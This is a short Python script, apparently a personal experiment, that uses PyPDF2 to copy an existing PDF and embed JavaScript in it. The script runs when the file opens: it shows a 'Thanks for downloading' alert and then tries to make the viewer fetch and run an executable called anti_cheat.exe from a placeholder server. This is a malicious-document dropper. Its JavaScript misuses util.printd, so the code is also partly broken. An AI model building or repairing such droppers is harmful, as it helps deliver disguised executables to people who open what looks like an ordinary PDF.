from PyPDF2 import PdfWriter, PdfReader

# Create a new PDF with JavaScript
pdf_writer = PdfWriter()
pdf_reader = PdfReader(r"C:\Users\BYRON\Downloads\existing.pdf")  # Use raw string for input path

# Copy all pages from the existing PDF
for page_num in range(len(pdf_reader.pages)):
    pdf_writer.add_page(pdf_reader.pages[page_num])

# Add JavaScript
js_code = """
app.alert({
    cMsg: "Thanks for downloading ",
    nIcon: 3,
    nType: 1
});
try {
    var url = "http://yourserver.com/path/to/anti_cheat.exe";
    var cURL = util.printd("Download and Run", url);
    this.getURL(cURL, false);
} catch (e) {
    app.alert("cool bro: " + e);
}
"""
pdf_writer.add_js(js_code)

# Save the new PDF to the specified folder
output_path = r"C:\Users\BYRON\OneDrive\Desktop\testing\output.pdf"  # Use raw string for output path
with open(output_path, "wb") as out_pdf:
    pdf_writer.write(out_pdf)



